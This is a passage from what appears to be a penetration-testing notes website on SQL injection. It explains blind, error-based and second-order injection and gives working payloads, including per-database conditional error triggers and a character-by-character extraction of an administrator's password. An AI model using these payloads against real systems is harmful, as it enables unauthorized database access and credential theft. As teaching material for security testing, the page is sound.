<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">all_tab_columns</span> <span class="k">WHERE</span> <span class="k">table_name</span> <span class="o">=</span> <span class="s1">'Users'</span></code></pre></figure> <h2 id="blind-sql-injection-vulnerabilities"> <a href="#blind-sql-injection-vulnerabilities" class="anchor-heading" aria-labelledby="blind-sql-injection-vulnerabilities"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Blind SQL Injection Vulnerabilities </h2> <p>A blind SQL injection is where the application doesn’t return the results of the query or the details of any database errors within its response. These vulnerabilities can still be exploited to access unauthorized data, however, techniques are generally more complicated and difficult to perform.</p> <p>Depending on the nature of the vulnerability, the following techniques can be used to exploit blind SQLi vulnerabilities:</p> <ul> <li>You can change the logic of the query to trigger a detectable difference in the application’s response depending on the truth of a single condition. This might involve injecting a new condition into some Boolean logic, or conditionally triggering an error such as a divide-by-zero.</li> <li>You can conditionally trigger a time delay in the processing of the query, allowing you to infer the truth of the condition based on the response time.</li> <li>You can trigger an out-of-band network interaction, using <a href="https://alipali737.github.io/pen-test-docs/Knowledge/Testing/Application%20Security%20Testing%20Methods.html#out-of-band-application-security-testing-oast">OAST</a> techniques. Often you can directly exfiltrate data via the out-of-band channel eg. placing the data into a DNS lookup for a domain you control.</li> </ul> <p>It is important to ensure that the injection is being treated as SQL and not something else, an easy way to do this is my trying to execute a simple SQL syntax (like string concatenation) and something the produced the opposite:</p> <figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="n">Oracle</span><span class="p">:</span> 
<span class="n">a</span><span class="s1">' || (SELECT </span><span class="se">''</span><span class="s1"> FROM dual) || '</span>
<span class="n">a</span><span class="s1">' || (SELECT </span><span class="se">''</span><span class="s1"> FROM table-doesnt-exist) || '</span></code></pre></figure> <p>You can test a single boolean condition and trigger a database error if the condition is true.</p> <div class="table-wrapper"><table> <thead> <tr> <th> </th> <th> </th> </tr> </thead> <tbody> <tr> <td>Oracle</td> <td><code class="language-plaintext highlighter-rouge">SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual</code></td> </tr> <tr> <td>Microsoft</td> <td><code class="language-plaintext highlighter-rouge">SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END</code></td> </tr> <tr> <td>PostgreSQL</td> <td><code class="language-plaintext highlighter-rouge">1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)</code></td> </tr> <tr> <td>MySQL</td> <td><code class="language-plaintext highlighter-rouge">SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')</code></td> </tr> </tbody> </table></div> <p>This can then be expanded such as:</p> <figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="k">CASE</span> <span class="k">WHEN</span> <span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span> <span class="k">THEN</span> <span class="n">TO_CHAR</span><span class="p">(</span><span class="mi">1</span><span class="o">/</span><span class="mi">0</span><span class="p">)</span> <span class="k">ELSE</span> <span class="s1">''</span> <span class="k">END</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s1">'administrator'</span></code></pre></figure> <p>You can determine if a table exists by searching for the first row in a table:</p> <figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="s1">''</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">ROWNUM</span> <span class="o">=</span> <span class="mi">1</span></code></pre></figure> <p>A nice way to determine the length of a field could be by iterating over a condition of its length:</p> <figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="s1">' AND (SELECT '</span><span class="n">a</span><span class="s1">' FROM users WHERE username='</span><span class="n">administrator</span><span class="s1">' AND LENGTH(password)&gt;3)='</span><span class="n">a</span><span class="s1">'</span></code></pre></figure> <p>For cracking the value you can repeat a similar technique by testing each letter one by 1:</p> <figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="s1">' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='</span><span class="n">administrator</span><span class="s1">')='</span><span class="n">a</span><span class="s1">'
'</span> <span class="k">AND</span> <span class="p">(</span><span class="k">SELECT</span> <span class="k">SUBSTRING</span><span class="p">(</span><span class="n">password</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s1">'administrator'</span><span class="p">)</span><span class="o">=</span><span class="s1">'b'</span>
<span class="s1">' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='</span><span class="n">administrator</span><span class="s1">')='</span><span class="k">c</span><span class="s1">'
...
'</span> <span class="k">AND</span> <span class="p">(</span><span class="k">SELECT</span> <span class="k">SUBSTRING</span><span class="p">(</span><span class="n">password</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s1">'administrator'</span><span class="p">)</span><span class="o">=</span><span class="s1">'a'</span>
<span class="s1">' AND (SELECT SUBSTRING(password,16,1) FROM users WHERE username='</span><span class="n">administrator</span><span class="s1">')='</span><span class="n">a</span><span class="s1">'</span></code></pre></figure> <p>This can then be automated in a simple script to determine the length and then crack the password (could even create a thread for each character and speed it up) or use a system like Burp Intruder for more basic automation</p> <h2 id="second-order-sql-injection"> <a href="#second-order-sql-injection" class="anchor-heading" aria-labelledby="second-order-sql-injection"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Second-order SQL Injection </h2> <p>First-order SQL injection is where an application takes user input from an HTTP request and incorporates the input into an SQL query in an unsafe way.</p> <p>Second-order injections (also known as <strong>stored SQL injection</strong>), is where the application takes user input from an HTTP request and stores it for future use. This is usually done by placing the input into a database, but no vulnerability arises at the point where the data is stored. Later, when handling a different HTTP request, the application retrieves the stored data and incorporates it into an SQL query in an unsafe way.</p> <p><img src="/pen-test-docs/assets/images/sql-injection/second-order-sql-injection.svg" alt="Second-order SQL injection demo" /></p> <p>Second-order SQL injection often arises when developers are aware of SQL injection vulnerabilities, so they safely handle the initial placement of input into the database. However, later when processing the data, which has been deemed to be safe, it is handled in an unsafe way, because the developer wrongly deems it to be trusted.</p> <hr> <footer> <p class="text-small text-grey-dk-100 mb-0">This page is being build from gh-pages at revision 356325f0939cd0b4bd7a9ff47d8bccd91b417980</p> </footer> </div> </div> <div class="search-overlay"></div> </div> <script type="text/javascript" src="/pen-test-docs/assets/js/toggle_mode.js"></script> </body> </html>
